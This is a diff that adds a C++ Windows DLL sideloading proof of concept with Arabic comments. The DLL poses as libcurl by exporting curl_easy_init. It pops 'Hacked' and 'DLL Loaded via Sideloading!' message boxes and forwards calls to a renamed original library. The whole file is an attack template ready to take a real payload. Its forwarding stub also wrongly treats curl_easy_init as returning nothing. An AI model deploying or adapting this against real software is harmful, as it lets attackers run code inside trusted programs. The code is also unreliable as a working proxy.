@@ -1,0 +1,41 @@
+#include <windows.h>
+
+typedef void (*ORIGINAL_FUNC)();  // تعريف عام لدوال المكتبة الأصلية
+
+HMODULE hOriginalDLL = NULL;  // مقبض DLL الأصلي
+
+// تحميل المكتبة الأصلية
+void LoadOriginalDLL() {
+    if (!hOriginalDLL) {
+        hOriginalDLL = LoadLibraryA("original.dll");  // استبدل "original.dll" بالاسم الفعلي للملف الأصلي
+    }
+}
+
+// استدعاء دالة من المكتبة الأصلية
+FARPROC GetOriginalFunction(LPCSTR funcName) {
+    LoadOriginalDLL();
+    if (hOriginalDLL) {
+        return GetProcAddress(hOriginalDLL, funcName);
+    }
+    return NULL;
+}
+
+// مثال على دالة يتم إعادة توجيهها
+extern "C" __declspec(dllexport) void curl_easy_init() {
+    MessageBoxA(NULL, "DLL Sideloading Successful!", "Hacked", MB_OK | MB_ICONEXCLAMATION);
+
+    // استدعاء الدالة الأصلية
+    ORIGINAL_FUNC originalFunc = (ORIGINAL_FUNC)GetOriginalFunction("curl_easy_init");
+    if (originalFunc) {
+        originalFunc();
+    }
+}
+
+// دالة إدخال DLL
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        MessageBoxA(NULL, "DLL Loaded via Sideloading!", "Alert", MB_OK | MB_ICONEXCLAMATION);
+        LoadOriginalDLL();  // تحميل المكتبة الأصلية عند تحميل الـ DLL
+    }
+    return TRUE;
+}
